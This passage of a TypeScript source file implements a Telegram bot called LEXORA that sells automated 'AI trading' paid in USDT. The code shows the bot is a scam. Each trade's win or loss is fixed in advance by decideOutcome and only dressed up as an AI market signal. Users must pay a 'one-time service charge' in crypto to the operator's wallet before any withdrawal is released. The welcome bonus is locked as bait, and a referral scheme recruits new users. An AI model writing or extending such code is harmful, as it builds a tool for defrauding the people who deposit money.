/**
 * LEXORA Telegram interface: screens, flows and update routing.
 * Business logic lives in core.server (accounts/balances), engine.server
 * (market + settlement) and referrals.server.
 */
import {
  applyBalance,
  db,
  fromCents,
  getBalance,
  getOrCreateUser,
  getSettings,
  setUiState,
  signedUsd,
  toCents,
  track,
  usd,
  type LexoraUser,
  type Settings,
} from "./core.server";
import {
  decideOutcome,
  planTrade,
  sizeTrade,
  type TradePlan,
} from "./engine.server";
import { SHARE_CAPTION } from "./copy";
import { IMG } from "./images.server";
import { qualifyReferral, referralStats } from "./referrals.server";
import {
  answerCallback,
  deleteMessage,
  sendPhoto,
  detachScreen,
  kb,
  renderScreen,
  type Button,
} from "./telegram.server";

const LINE = "━━━━━━━━━━━━━━━";

export const appUrl = () =>
  process.env["APP_URL"] ?? "https://project--f7d5b767-7e2d-482f-a147-2287f89d926c.lovable.app";
export const botUsername = () => process.env["TELEGRAM_BOT_USERNAME"] ?? "LexoraBot";
export const refLink = (code: string) => `https://t.me/${botUsername()}?start=${code}`;

/** Consistent bottom navigation: back to the previous screen, plus home. */
const nav = (back?: string): Button[] =>
  back
    ? [{ text: "🔙 BACK", data: back }, { text: "🏠 MENU", data: "home" }]
    : [{ text: "🏠 MENU", data: "home" }];

/* ------------------------------ screens ------------------------------ */

async function welcomeScreen(u: LexoraUser, s: Settings) {
  await renderScreen(
    u,
    `🤖 LEXORA\nAI trading, inside Telegram.\n\n${LINE}\n\nOur AI studies the market and picks the trade.\nYou only choose how much to put in.\n\n🎁 Welcome bonus: ${usd(
      s.welcome_bonus,
    )}\nFree to start — no deposit needed.`,
    kb([
      [{ text: `🎁 CLAIM ${usd(s.welcome_bonus)} BONUS`, data: "claim" }],
      [{ text: "ℹ️ HOW IT WORKS", data: "how" }],
    ]),
    { photo: IMG.welcome() },
  );
}

export async function homeScreen(u: LexoraUser) {
  const b = await getBalance(u.id);
  const { count } = await db()
    .from("trades")
    .select("id", { count: "exact", head: true })
    .eq("user_id", u.id)
    .eq("status", "settled");
  await renderScreen(
    u,
    `🤖 LEXORA — MAIN MENU\n\n💰 Total balance:        ${usd(
      b.balance,
    )}\n🎁 Bonus (locked):       ${usd(b.bonus)}\n💸 Withdrawable profit:  ${usd(
      Math.max(0, Number(b.profit)),
    )}\n📊 Trades:               ${count ?? 0}\n\n${LINE}\nOnly withdrawable profit can be paid out — the bonus stays in your account for trading.`,
    kb([
      [{ text: "🚀 TRADE", data: "trade" }],
      [{ text: "💳 DEPOSIT", data: "deposit" }, { text: "💸 WITHDRAW", data: "wd" }],
      [{ text: "👥 INVITE & EARN", data: "invite" }],
      [{ text: "💰 WALLET", data: "wallet" }, { text: "📜 HISTORY", data: "history" }],
      [{ text: "ℹ️ HOW IT WORKS", data: "how" }],
    ]),
    { photo: IMG.logo() },
  );
}

async function howScreen(u: LexoraUser, s: Settings) {
  await renderScreen(
    u,
    `ℹ️ HOW LEXORA WORKS\n\n1. Claim your ${usd(
      s.welcome_bonus,
    )} bonus — no deposit.\n2. LEXORA AI picks the trade.\n3. You choose the amount.\n4. Trades run 30 min – 4 hours.\n5. Wins and losses update your balance.\n\n${LINE}\n\n💳 Deposit:  USDT (TRC-20) only, auto-credited\n💸 Withdraw: min ${usd(
      s.min_withdrawal,
    )} profit, after ${s.withdrawal_wait_hours}h\n👥 Invite:   friend gets ${usd(
      s.welcome_bonus,
    )}, you earn ${usd(
      s.referral_reward,
    )}\n\n⚠️ Trading involves risk. Markets can move against a trade.`,
    kb([nav()]),
  );
}

/* ------------------------------ trade flow ------------------------------ */

async function startTrade(u: LexoraUser, s: Settings) {
  const b = await getBalance(u.id);
  if (toCents(b.balance) < 100) {
    await renderScreen(
      u,
      `⚠️ NOT ENOUGH BALANCE\n\nBalance:  ${usd(
        b.balance,
      )}\nMinimum:  $1.00\n\n${LINE}\nDeposit USDT or invite friends to top up.`,
      kb([
        [{ text: "💳 DEPOSIT", data: "deposit" }],
        [{ text: "👥 INVITE & EARN", data: "invite" }],
        nav(),
      ]),
    );
    return;
  }
  const plan = await planTrade(s);
  await setUiState(u.id, { plan });
  u.ui_state = { plan };
  await track(u.id, "ai_recommendation", plan);
  await tradeScreen(u, s);
}

const dirIcon = (d: string) => (d === "LONG" ? "📈" : "📉");
const dirWord = (d: string) => (d === "LONG" ? "BUY (price going up)" : "SELL (price going down)");
const durText = (m: number) =>
  m >= 60 ? `${m / 60 === Math.floor(m / 60) ? m / 60 : (m / 60).toFixed(1)} hour${m >= 120 ? "s" : ""}` : `${m} minutes`;
const price = (v: number) => `$${Number(v).toLocaleString("en-US", { maximumFractionDigits: 4 })}`;
const RISK = "balanced";

/** Step 1 — the AI trade plus the only choice the user makes: how much. */
async function tradeScreen(u: LexoraUser, s: Settings) {
  const plan = (u.ui_state as { plan?: TradePlan }).plan;
  if (!plan) return startTrade(u, s);
  const b = await getBalance(u.id);
  const factor = s.risk_profiles[RISK] ?? 0.25;
  const rec = sizeTrade(Number(b.balance), factor, plan.confidence, s);
  const presets = [2.5, 5, 10, 25];
  const options = [...new Set([rec.amount, ...presets])]
    .filter((v) => v <= Number(b.balance))
    .sort((a, c) => a - c);
  await setUiState(u.id, { plan, risk: RISK, rec: rec.amount });
  await renderScreen(
    u,
    `🤖 AI FOUND A TRADE\n\nMarket:    ${plan.symbol}\nSignal:    ${dirIcon(
      plan.direction,
    )} ${dirWord(plan.direction)}\nDuration:  ${durText(plan.duration_minutes)}${
      s.show_confidence ? `\nConfidence: ${plan.confidence}%` : ""
    }\nBalance:   ${usd(b.balance)}\n\n${LINE}\nSTEP 1 OF 2 — choose your amount`,
    kb([
      ...options.map((v) => [
        { text: `${usd(v)}${v === rec.amount ? "  ⭐ AI PICK" : ""}`, data: `amt:${v}` },
      ]),
      [{ text: "✏️ OTHER AMOUNT", data: "custom" }],
      [{ text: "🔄 NEW TRADE", data: "trade" }],
      nav(),
    ]),
  );
}

/** Step 2 — confirm. */
async function confirmScreen(u: LexoraUser, s: Settings, amount: number) {
  const st = u.ui_state as { plan?: TradePlan };
  if (!st.plan) return startTrade(u, s);
  const b = await getBalance(u.id);
  if (toCents(amount) > toCents(b.balance)) {
    await renderScreen(
      u,
      `⚠️ AMOUNT TOO HIGH\n\nYour balance is ${usd(b.balance)}.`,
      kb([nav("setup")]),
    );
    return;
  }
  const factor = s.risk_profiles[RISK] ?? 0.25;
  const sized = sizeTrade(amount, 1, st.plan.confidence, s);
  const draft = {
    amount,
    leverage: factor >= 0.4 ? 10 : factor >= 0.2 ? 5 : 2,
    potential_profit: sized.potential_profit,
    potential_loss: sized.potential_loss,
  };
  await setUiState(u.id, { ...st, risk: RISK, draft });
  await renderScreen(
    u,
    `⚡ CONFIRM TRADE\n\nMarket:   ${st.plan.symbol}\nSignal:   ${dirIcon(
      st.plan.direction,
    )} ${dirWord(st.plan.direction)}\nAmount:   ${usd(amount)}\nDuration: ${durText(
      st.plan.duration_minutes,
    )}\n\n🎯 If it wins:  +${usd(draft.potential_profit)}\n🛑 If it loses: -${usd(
      draft.potential_loss,
    )}\n\n${LINE}\nSTEP 2 OF 2 — markets can move against a trade.`,
    kb([[{ text: "✅ START TRADE", data: "enter" }], nav("setup")]),
  );
}

export function activeTradeText(t: {
  symbol: string;
  direction: string;
  entry_price: number;
  current_price: number;
  take_profit: number;
  stop_loss: number;
  potential_profit: number;
  potential_loss: number;
  expires_at: string;
}) {
  const msLeft = new Date(t.expires_at).getTime() - Date.now();
  const mins = Math.max(0, Math.round(msLeft / 60000));
  const remaining = mins >= 60 ? `${Math.floor(mins / 60)}h ${mins % 60}m` : `${mins}m`;
  return `⚡ TRADE ACTIVE\n\nMarket:   ${t.symbol}\nSignal:   ${dirIcon(t.direction)} ${
    t.direction
  }\nEntry:    ${price(t.entry_price)}\nCurrent:  ${price(t.current_price)}\n🎯 Target: ${price(
    t.take_profit,
  )}\n🛑 Stop:   ${price(t.stop_loss)}\n⏱ Left:    ${remaining}\n\n${LINE}\nWin:  +${usd(
    t.potential_profit,
  )}\nLoss: -${usd(t.potential_loss)}`;
}

async function enterTrade(u: LexoraUser, s: Settings) {
  const st = u.ui_state as {
    plan?: TradePlan;
    risk?: string;
    draft?: { amount: number; leverage: number; potential_profit: number; potential_loss: number };
  };
  if (!st.plan || !st.draft) return startTrade(u, s);
  const b = await getBalance(u.id);
  if (toCents(st.draft.amount) > toCents(b.balance)) return tradeScreen(u, s);

  const { data: recent } = await db()
    .from("trades")
    .select("result")
    .eq("user_id", u.id)
    .eq("status", "settled")
    .order("settled_at", { ascending: false })
    .limit(50);
  const outcomeCtx = {
    settled: recent?.length ?? 0,
    lastResult: recent?.[0]?.result ?? null,
  };

  const now = Date.now();
  const { data: trade, error } = await db()
    .from("trades")
    .insert({
      user_id: u.id,
      symbol: st.plan.symbol,
      direction: st.plan.direction,
      amount: st.draft.amount,
      leverage: st.draft.leverage,
      risk_profile: st.risk ?? "balanced",
      entry_price: st.plan.entry_price,
      take_profit: st.plan.take_profit,
      stop_loss: st.plan.stop_loss,
      current_price: st.plan.entry_price,
      confidence: st.plan.confidence,
      duration_minutes: st.plan.duration_minutes,
      potential_profit: st.draft.potential_profit,
      potential_loss: st.draft.potential_loss,
      target_outcome: decideOutcome(st.plan.confidence, s, outcomeCtx),
      message_id: u.screen_message_id,
      expires_at: new Date(now + st.plan.duration_minutes * 60000).toISOString(),
    })
    .select("*")
    .single();
  if (error) throw error;

  await applyBalance(u.id, { balance: -st.draft.amount }, {
    kind: "trade_open",
    amount: -st.draft.amount,
    ref_id: trade.id,
  });
  await track(u.id, "trade_opened", {
    symbol: trade.symbol,
    amount: trade.amount,
    risk: trade.risk_profile,
    accepted_ai: true,
  });
  await setUiState(u.id, {});
  await renderScreen(u, activeTradeText(trade), kb([nav()]));
  // The active trade message now owns its own lifecycle (edited by the tick job).
  await detachScreen(u.id);
}

/* ------------------------------ deposits ------------------------------ */

async function depositScreen(u: LexoraUser, s: Settings) {
  const wallet = String(s.fee_wallet ?? "");
  if (!wallet) {
    await renderScreen(
      u,
      "⚙️ DEPOSITS TEMPORARILY UNAVAILABLE\n\nPlease try again shortly.",
      kb([nav()]),
    );
    return;
  }
  const { openDeposit } = await import("./deposits.server");
  const existing = await openDeposit(u.id);
  if (existing) return depositPayScreen(u, s, existing);

  await renderScreen(
    u,
    `💳 DEPOSIT — USDT (TRC-20)\n\nFund your account with USDT on the TRON network. Deposits are credited automatically once confirmed on the blockchain.\n\n${LINE}\nHow much do you want to deposit?`,
    kb([
      [
        { text: "$10", data: "dep:10" },
        { text: "$25", data: "dep:25" },
      ],
      [
        { text: "$50", data: "dep:50" },
        { text: "$100", data: "dep:100" },
      ],
      [{ text: "✏️ OTHER AMOUNT", data: "depcustom" }],
      nav(),
    ]),
    { photo: IMG.deposit() },
  );
}

async function depositPayScreen(
  u: LexoraUser,
  s: Settings,
  dep: { id: string; unique_amount: number; wallet_address: string; message_id: number | null },
) {
  await renderScreen(
    u,
    `⏳ AWAITING PAYMENT\n\n💳 DEPOSIT — USDT (TRC-20)\n\nSend exactly:\n${Number(
      dep.unique_amount,
    ).toFixed(2)} USDT\n\nTo this address:\n${dep.wallet_address}\n\n${LINE}\n⚠️ TRON (TRC-20) only. Send the exact amount — the cents identify your payment.\n\nYour balance is credited automatically, usually within 1–3 minutes. You can close Telegram.`,
    kb([
      [{ text: "❌ CANCEL DEPOSIT", data: `depcancel:${dep.id}` }],
      nav(),
    ]),
    { photo: IMG.deposit() },
  );
  if (!dep.message_id && u.screen_message_id) {
    await db()
      .from("deposits")
      .update({ message_id: u.screen_message_id })
      .eq("id", dep.id);
    // This message now belongs to the deposit and is edited by the sweep.
    await detachScreen(u.id);
  }
}

async function newDeposit(u: LexoraUser, s: Settings, amount: number) {
  const wallet = String(s.fee_wallet ?? "");
  if (!wallet || !amount || amount < 1) return depositScreen(u, s);
  const { createDeposit, openDeposit } = await import("./deposits.server");
  const existing = await openDeposit(u.id);
  if (existing) return depositPayScreen(u, s, existing);
  const dep = await createDeposit(u.id, Math.floor(amount), wallet);
  if (!dep) return depositScreen(u, s);
  await setUiState(u.id, {});
  u.ui_state = {};
  return depositPayScreen(u, s, dep);
}

/* ------------------------------ wallet ------------------------------ */

function eligibleAt(u: LexoraUser, s: Settings) {
  return new Date(u.created_at).getTime() + s.withdrawal_wait_hours * 3600000;
}

async function walletScreen(u: LexoraUser, s: Settings) {
  const b = await getBalance(u.id);
  await renderScreen(
    u,
    `💰 MY WALLET\n\n💰 Total balance:        ${usd(
      b.balance,
    )}\n🎁 Bonus (not withdrawable): ${usd(b.bonus)}\n📈 Trading profit:        ${signedUsd(
      Number(b.profit),
    )}\n💸 Withdrawable profit:   ${usd(
      Math.max(0, Number(b.profit)),
    )}\n👥 Referral rewards:      ${usd(
      b.referral_balance,
    )}\n\n${LINE}\nOnly withdrawable profit can be paid out — the ${usd(
      s.welcome_bonus,
    )} bonus stays in the account for trading.\nWithdrawals: min ${usd(
      s.min_withdrawal,
    )} profit, ${s.withdrawal_wait_hours}h after registration.`,
    kb([
      [{ text: "💳 DEPOSIT", data: "deposit" }, { text: "💸 WITHDRAW", data: "wd" }],
      [{ text: "📜 WITHDRAWALS", data: "wdlist" }],
      nav(),
    ]),
  );
}

async function withdrawScreen(u: LexoraUser, s: Settings) {
  const b = await getBalance(u.id);
  const eligible = Math.max(0, Number(b.profit));
  const openAt = eligibleAt(u, s);
  const ageOk = Date.now() >= openAt;
  const amountOk = toCents(eligible) >= toCents(s.min_withdrawal);
  const mark = (ok: boolean) => (ok ? "✅" : "❌");

  const left = Math.max(0, openAt - Date.now());
  const d = Math.floor(left / 86400000);
  const h = Math.floor((left % 86400000) / 3600000);

  const { data: openWd } = await db()
    .from("withdrawals")
    .select("id,amount,service_fee_status")
    .eq("user_id", u.id)
    .eq("service_fee_status", "pending")
    .limit(1);
  if (openWd?.length) return feeScreen(u, s, openWd[0]!.id);

  if (!ageOk || !amountOk) {
    await renderScreen(
      u,
      `💸 WITHDRAW\n\nOnly profit can be withdrawn. Your ${usd(
        s.welcome_bonus,
      )} bonus is trading capital and stays in the account.\n\n${LINE}\n\n${mark(
        amountOk,
      )} Profit of at least ${usd(s.min_withdrawal)}\n    You have: ${usd(eligible)}\n\n${mark(
        ageOk,
      )} Account older than ${s.withdrawal_wait_hours}h\n    ${
        ageOk ? "Unlocked" : `Unlocks in ${d}d ${h}h`
      }\n\n${LINE}\nA one-time ${usd(
        s.service_fee,
      )} service charge applies to your first withdrawal.`,
      kb([
        [{ text: "🚀 TRADE", data: "trade" }],
        [{ text: "👥 INVITE & EARN", data: "invite" }],
        nav("wallet"),
      ]),
    );
    return;
  }

  await setUiState(u.id, { flow: "wd_address", amount: eligible });
  await renderScreen(
    u,
    `💸 WITHDRAW PROFIT\n\n✅ Profit of at least ${usd(
      s.min_withdrawal,
    )}\n✅ Account older than ${s.withdrawal_wait_hours}h\n\nAmount:   ${usd(
      eligible,
    )}\nNetwork:  🔴 TRON (TRC-20)\nCharge:   ${usd(
      s.service_fee,
    )} one-time (next step)\n\n${LINE}\n⚠️ Only a USDT TRC-20 address. A wrong network means permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
    kb([nav("wallet")]),
  );
}

/** The one-time service-charge payment screen. */
async function feeScreen(u: LexoraUser, s: Settings, id?: string) {
  if (!id) return walletScreen(u, s);
  const { data: wd } = await db()
    .from("withdrawals")
    .select("id,amount,service_fee_amount,service_fee_status,fee_requested_at")
    .eq("id", id)
    .maybeSingle();
  if (!wd) return walletScreen(u, s);
  if (wd.service_fee_status !== "pending") return withdrawalsScreen(u);

  const wallet = String(s.fee_wallet ?? "");
  if (!wallet) {
    await renderScreen(
      u,
      "⚙️ PAYMENT TEMPORARILY UNAVAILABLE\n\nPlease try again shortly.",
      kb([nav()]),
    );
    return;
  }
  const minsLeft = Math.max(
    0,
    Math.round(
      (new Date(wd.fee_requested_at ?? Date.now()).getTime() +
        Number(s.fee_window_minutes) * 60000 -
        Date.now()) /
        60000,
    ),
  );
  await renderScreen(
    u,
    `🔐 ONE-TIME SERVICE CHARGE\n\nWithdrawal: ${usd(
      wd.amount,
    )}\nCharge:     one-time, per account\n\n${LINE}\n\nSend exactly:\n${Number(
      wd.service_fee_amount,
    ).toFixed(2)} USDT\n\nNetwork:  🔴 TRON (TRC-20)\nAddress:\n${wallet}\n\n${LINE}\n⚠️ Send the exact amount — the cents identify your payment.\n⏳ Time left: ${minsLeft} minutes\n\nWe confirm it on the blockchain, then your withdrawal is released.`,
    kb([
      [{ text: "🔄 I HAVE PAID — CHECK", data: `feechk:${wd.id}` }],
      [{ text: "❌ CANCEL WITHDRAWAL", data: `fcancel:${wd.id}` }],
      nav("wallet"),
    ]),
  );
}

async function checkFeeNow(u: LexoraUser, s: Settings, id?: string) {
  if (!id) return walletScreen(u, s);
  const { verifyFee } = await import("./payments.server");
  const res = await verifyFee(id);
  if (res.paid) {
    await setUiState(u.id, {});
    await renderScreen(
      u,
      "✅ PAYMENT CONFIRMED\n\nYour service charge was found on the blockchain.\n\nYour withdrawal is now being processed and will be sent after review.",
      kb([[{ text: "📜 WITHDRAWALS", data: "wdlist" }], nav()]),
    );
    return;
  }
  await renderScreen(
    u,
    "🔎 NOT FOUND YET\n\nWe could not find the payment on the blockchain yet.\n\nTransfers usually confirm in 1–3 minutes. Make sure you sent the exact amount on TRC-20, then check again.",
    kb([
      [{ text: "🔄 CHECK AGAIN", data: `feechk:${id}` }],
      [{ text: "💳 PAYMENT DETAILS", data: `fee:${id}` }],
      nav("wallet"),
    ]),
  );
}

async function cancelWithdrawal(u: LexoraUser, s: Settings, id?: string) {
  if (!id) return walletScreen(u, s);
  const { data: wd } = await db()
    .from("withdrawals")
    .select("id,user_id,amount,service_fee_status")
    .eq("id", id)
    .maybeSingle();
  if (!wd || wd.user_id !== u.id || wd.service_fee_status !== "pending") return walletScreen(u, s);
  await db()
    .from("withdrawals")
    .update({
      status: "cancelled",
      service_fee_status: "cancelled",
      updated_at: new Date().toISOString(),
    })
    .eq("id", wd.id);
  await applyBalance(
    u.id,
    { balance: Number(wd.amount), profit: Number(wd.amount) },
    { kind: "withdrawal_cancelled", amount: Number(wd.amount), ref_id: wd.id },
  );
  await setUiState(u.id, {});
  return walletScreen(u, s);
}

async function withdrawalsScreen(u: LexoraUser) {
  const { data } = await db()
    .from("withdrawals")
    .select("amount,status,created_at")
    .eq("user_id", u.id)
    .order("created_at", { ascending: false })
    .limit(10);
  const rows = (data ?? [])
    .map((w) => `${usd(w.amount)}  —  ${String(w.status).toUpperCase()}`)
    .join("\n");
  await renderScreen(
    u,
    `📜 WITHDRAWALS\n\n${rows || "No withdrawals yet."}`,
    kb([nav("wallet")]),
  );
}

/* ------------------------------ referrals ------------------------------ */

async function inviteScreen(u: LexoraUser, s: Settings) {
  const st = await referralStats(u.id);
  const filled = st.next ? Math.round((st.active / st.next.active_referrals) * 10) : 10;
  const bar = "█".repeat(Math.min(10, filled)) + "░".repeat(Math.max(0, 10 - filled));
  await renderScreen(
    u,
    `👥 INVITE & EARN\n\n🎁 Friend gets: ${usd(s.welcome_bonus)}\n💰 You earn:    ${usd(
      s.referral_reward,
    )} per active referral\n\n${LINE}\n\n👥 Invited:  ${st.invited}\n✅ Active:   ${
      st.active
    }\n💰 Rewards:  ${usd(st.rewards)}${
      st.next
        ? `\n\n🎯 Next milestone: ${st.next.active_referrals} active\n${bar} ${st.active}/${st.next.active_referrals}`
        : "\n\n🏆 All milestones unlocked!"
    }`,
    kb([
      [{ text: "🔗 GET MY LINK", data: "link" }],
      [{ text: "🎯 MILESTONES", data: "ms" }, { text: "💰 MY REWARDS", data: "rewards" }],
      nav(),
    ]),
  );
}

async function milestonesScreen(u: LexoraUser) {
  const st = await referralStats(u.id);
  const { data } = await db()
    .from("milestones")
    .select("active_referrals,reward_amount")
    .eq("active", true)
    .order("active_referrals");
  const rows = (data ?? [])
    .map(
      (m) =>
        `${st.active >= m.active_referrals ? "✅" : "🎯"} ${m.active_referrals} active  —  ${usd(
          m.reward_amount,
        )}`,
    )
    .join("\n");
  await renderScreen(
    u,
    `🎯 MILESTONES\n\n${rows}\n\n${LINE}\n✅ Active referrals: ${st.active}`,
    kb([nav("invite")]),
  );
}

async function rewardsScreen(u: LexoraUser, s: Settings) {
  const b = await getBalance(u.id);
  const next = new Date();
  next.setMonth(next.getMonth() + (next.getDate() >= s.payout_day ? 1 : 0));
  next.setDate(Math.min(s.payout_day, 28));
  await renderScreen(
    u,
    `💰 REFERRAL REWARDS\n\nAvailable:   ${usd(
      b.referral_balance,
    )}\n📅 Next payout: ${next.toLocaleDateString("en-US", {
      month: "long",
      day: "numeric",
    })}\nStatus:      ⏳ Pending review`,
    kb([nav("invite")]),
  );
}

/* ------------------------------ history ------------------------------ */

async function historyScreen(u: LexoraUser) {
  const { data } = await db()
    .from("trades")
    .select("symbol,pnl,result")
    .eq("user_id", u.id)
    .eq("status", "settled")
    .order("settled_at", { ascending: false })
    .limit(10);
  const trades = data ?? [];
  const wins = trades.filter((t) => t.result === "win").length;
  const total = trades.reduce((acc, t) => acc + toCents(t.pnl ?? 0), 0);
  const rows = trades
    .map((t) => `${t.result === "win" ? "🟢" : "🔴"} ${t.symbol}  ${signedUsd(Number(t.pnl ?? 0))}`)
    .join("\n");
  await renderScreen(
    u,
    `📜 TRADE HISTORY\n\n${rows || "No trades yet."}\n\n${LINE}\nTrades: ${trades.length}   Wins: ${wins}   Losses: ${
      trades.length - wins
    }\nProfit: ${signedUsd(fromCents(total))}`,
    kb([[{ text: "🚀 TRADE", data: "trade" }], nav()]),
  );
}

/* ------------------------------ routing ------------------------------ */

async function claimBonus(u: LexoraUser, s: Settings) {
  const fresh = await db().from("users").select("bonus_claimed").eq("id", u.id).single();
  if (fresh.data?.bonus_claimed) return homeScreen(u);
  await db()
    .from("users")
    .update({
      bonus_claimed: true,
      bonus_claimed_at: new Date().toISOString(),
      bonus_amount: s.welcome_bonus,
    })
    .eq("id", u.id);
  await applyBalance(
    u.id,
    { balance: s.welcome_bonus, bonus: s.welcome_bonus },
    { kind: "welcome_bonus", amount: s.welcome_bonus },
  );
  await track(u.id, "bonus_claimed", { amount: s.welcome_bonus });
  u.bonus_claimed = true;
  await renderScreen(
    u,
    `🎉 CONGRATULATIONS!\n\nYour ${usd(
      s.welcome_bonus,
    )} welcome bonus has been added.\n\n💰 Balance: ${usd(
      s.welcome_bonus,
    )}\n\n${LINE}\nYou're all set — let the AI find your first trade.`,
    kb([
      [{ text: "🚀 START TRADING", data: "trade" }],
      [{ text: "👥 INVITE & EARN", data: "invite" }],
    ]),
    { photo: IMG.welcome() },
  );
}

async function route(u: LexoraUser, s: Settings, action: string) {
  if (!u.bonus_claimed && !["claim", "how"].includes(action)) return welcomeScreen(u, s);
  const [key, arg] = action.split(":");
  switch (key) {
    case "home":
      return homeScreen(u);
    case "how":
      return howScreen(u, s);
    case "claim":
      return claimBonus(u, s);
    case "trade":
      return startTrade(u, s);
    case "setup":
    case "amount":
      return tradeScreen(u, s);
    case "amt":
      return confirmScreen(u, s, Number(arg));
    case "deposit":
      return depositScreen(u, s);
    case "dep":
      return newDeposit(u, s, Number(arg));
    case "depcustom":
      await setUiState(u.id, { flow: "deposit_amount" });
      u.ui_state = { flow: "deposit_amount" };
      return renderScreen(
        u,
        "✏️ DEPOSIT AMOUNT\n\nSend the amount in USDT you want to deposit (e.g. 40).",
        kb([nav("deposit")]),
      );
    case "depcancel": {
      const { cancelDeposit } = await import("./deposits.server");
      if (arg) await cancelDeposit(u.id, arg);
      return depositScreen(u, s);
    }
    case "fee":
      return feeScreen(u, s, arg);
    case "feechk":
      return checkFeeNow(u, s, arg);
    case "fcancel":
      return cancelWithdrawal(u, s, arg);
    case "custom":
      await setUiState(u.id, { ...(u.ui_state as object), flow: "custom_amount" });
      return renderScreen(
        u,
        "✏️ CUSTOM AMOUNT\n\nSend the amount you want to trade (e.g. 7.50).",
        kb([nav("setup")]),
      );
    case "enter":
      return enterTrade(u, s);
    case "wallet":
      return walletScreen(u, s);
    case "wd":
      return withdrawScreen(u, s);
    case "wdlist":
      return withdrawalsScreen(u);
    case "wdconfirm":
      return submitWithdrawal(u, s);
    case "invite":
      return inviteScreen(u, s);
    case "link": {
      const message = `${SHARE_CAPTION}\n${refLink(u.referral_code)}`;
      const esc = (t: string) =>
        t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      return renderScreen(
        u,
        `🔗 <b>YOUR SHARE MESSAGE</b>\n\nTap the block below to copy the full caption <i>and</i> your link, then paste it anywhere.\n\n<pre>${esc(
          message,
        )}</pre>\n\nYou earn ${usd(s.referral_reward)} for every friend who becomes active.`,
        kb([
          [{ text: "🔗 COPY LINK ONLY", data: "linkonly" }],
          nav("invite"),
        ]),
        { parseMode: "HTML" },
      );
    }
    case "linkonly": {
      const esc = (t: string) =>
        t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      return renderScreen(
        u,
        `🔗 <b>YOUR REFERRAL LINK</b>\n\nTap to copy:\n\n<pre>${esc(
          refLink(u.referral_code),
        )}</pre>`,
        kb([[{ text: "📝 FULL SHARE MESSAGE", data: "link" }], nav("invite")]),
        { parseMode: "HTML" },
      );
    }
    case "ms":
      return milestonesScreen(u);
    case "rewards":
      return rewardsScreen(u, s);
    case "history":
      return historyScreen(u);
    default:
      return homeScreen(u);
  }
}

async function submitWithdrawal(u: LexoraUser, s: Settings) {
  const st = u.ui_state as { amount?: number; address?: string };
  if (!st.amount || !st.address) return walletScreen(u, s);
  const b = await getBalance(u.id);
  if (toCents(st.amount) > toCents(b.profit)) return walletScreen(u, s);

  const { data: alreadyPaid } = await db()
    .from("withdrawals")
    .select("id")
    .eq("user_id", u.id)
    .eq("service_fee_status", "paid")
    .limit(1);
  const feeDone = !!alreadyPaid?.length;

  const { data: wd } = await db()
    .from("withdrawals")
    .insert({
      user_id: u.id,
      amount: st.amount,
      wallet_address: st.address,
      status: feeDone ? "pending" : "awaiting_fee",
      service_fee_status: feeDone ? "waived" : "pending",
    })
    .select("id")
    .single();

  // Flag wallet reuse across accounts for admin review.
  const reuse = await db()
    .from("withdrawals")
    .select("user_id")
    .eq("wallet_address", st.address)
    .neq("user_id", u.id)
    .limit(1);
  if (reuse.data?.length) {
    await db().from("users").update({ flagged_reason: "wallet_reuse" }).eq("id", u.id);
  }

  await applyBalance(
    u.id,
    { balance: -st.amount, profit: -st.amount },
    { kind: "withdrawal_request", amount: -st.amount, ref_id: wd?.id },
  );
  await track(u.id, "withdrawal_requested", { amount: st.amount });
  await setUiState(u.id, {});

  if (wd?.id && !feeDone) {
    const { feeAmountFor } = await import("./payments.server");
    await db()
      .from("withdrawals")
      .update({
        service_fee_amount: feeAmountFor(wd.id, Number(s.service_fee)),
        fee_requested_at: new Date().toISOString(),
      })
      .eq("id", wd.id);
    u.ui_state = {};
    await feeScreen(u, s, wd.id);
    return;
  }

  const msg = await sendPhoto(
    u.telegram_id,
    IMG.withdrawProcessing(),
    `⏳ WITHDRAWAL PROCESSING\n\nAmount:  ${usd(
      st.amount,
    )}\nNetwork: TRON (TRC-20)\nWallet:\n${st.address}\n\nStatus:  Pending`,
  );
  if (msg?.message_id && wd?.id) {
    await db().from("withdrawals").update({ message_id: msg.message_id }).eq("id", wd.id);
  }
  await homeScreen(u);
}

/* ------------------------------ update handler ------------------------------ */

type TgUpdate = {
  message?: {
    message_id: number;
    chat: { id: number };
    from: { id: number; username?: string; first_name?: string };
    text?: string;
  };
  callback_query?: {
    id: string;
    data?: string;
    from: { id: number; username?: string; first_name?: string };
    message?: { message_id: number; chat: { id: number } };
  };
};

const COMMANDS: Record<string, string> = {
  "/home": "home",
  "/start": "home",
  "/trade": "trade",
  "/deposit": "deposit",
  "/invite": "invite",
  "/wallet": "wallet",
  "/history": "history",
  "/how": "how",
};

export async function handleUpdate(update: TgUpdate) {
  const s = await getSettings();

  if (update.callback_query) {
    const cq = update.callback_query;
    await answerCallback(cq.id);
    const u = await getOrCreateUser(cq.from);
    if (u.status === "blocked") return;
    if (cq.message && !u.screen_message_id) {
      await db().from("users").update({ screen_message_id: cq.message.message_id }).eq("id", u.id);
      u.screen_message_id = cq.message.message_id;
    }
    await route(u, s, cq.data ?? "home");
    return;
  }

  const m = update.message;
  if (!m?.text) return;
  const text = m.text.trim();
  const isCommand = text.startsWith("/");
  const refCode = text.startsWith("/start ") ? text.split(" ")[1] : undefined;
  const u = await getOrCreateUser(m.from, refCode);
  if (u.status === "blocked") return;

  // Keep the chat clean: the user's command/input is transient.
  await deleteMessage(m.chat.id, m.message_id);

  const st = u.ui_state as { flow?: string; amount?: number };

  if (!isCommand && st.flow === "custom_amount") {
    const amount = Number(text.replace(/[^0-9.]/g, ""));
    if (!amount || amount <= 0) {
      await renderScreen(u, "⚠️ Enter a valid amount, e.g. 7.50", kb([nav("setup")]));
      return;
    }
    await setUiState(u.id, { ...(u.ui_state as object), flow: undefined });
    u.ui_state = { ...(u.ui_state as object), flow: undefined };
    await confirmScreen(u, s, fromCents(toCents(amount)));
    return;
  }

  if (!isCommand && st.flow === "deposit_amount") {
    const amount = Math.floor(Number(text.replace(/[^0-9.]/g, "")));
    if (!amount || amount < 1) {
      await renderScreen(u, "⚠️ Enter a valid amount in USDT, e.g. 40", kb([nav("deposit")]));
      return;
    }
    await newDeposit(u, s, amount);
    return;
  }

  if (!isCommand && st.flow === "wd_address") {
    const address = text;
    if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
      await renderScreen(
        u,
        "⚠️ That does not look like a USDT TRC-20 address.\n\nIt must start with T and be 34 characters.\nSend it again 👇",
